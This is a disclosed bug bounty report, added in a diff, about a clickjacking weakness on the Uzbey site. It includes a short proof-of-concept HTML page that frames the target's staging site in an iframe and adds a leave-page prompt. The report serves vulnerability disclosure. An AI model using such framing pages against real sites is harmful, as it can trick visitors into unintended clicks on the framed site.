@@ -1,0 +1,42 @@
+ReportLink:https://hackerone.com/reports/17315
+WeaknessName:UI Redressing (Clickjacking)
+Reporter:https://hackerone.com/vineet
+ReportedTo:Uzbey(uzbey)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:07.08.2014 18:54:30
+
+Summary:
+
+hi, i found your site is vulnerable to clickjacking.
+poc:    
+<html><head>
+<title>  testing </title>
+<style>
+
+frame {
+
+opacity: 0.5;
+border: none;
+position: absolute;
+top: 0px;
+left: 0px;
+z-index: 1000;
+}
+</style>
+</head>
+<body>
+<script>
+   window.onbeforeunload = function()
+   {
+      return " Do you want to leave ?";
+   }
+</script>
+<p> site is vulnerable for Clickjacking! by Vineet bhardwaj</p>
+<iframe id="frame" width="100%" height="100%" src="https://staging.uzbey.com/"></iframe>
+</body>
+</html>
+
+
+please check the attachment ...
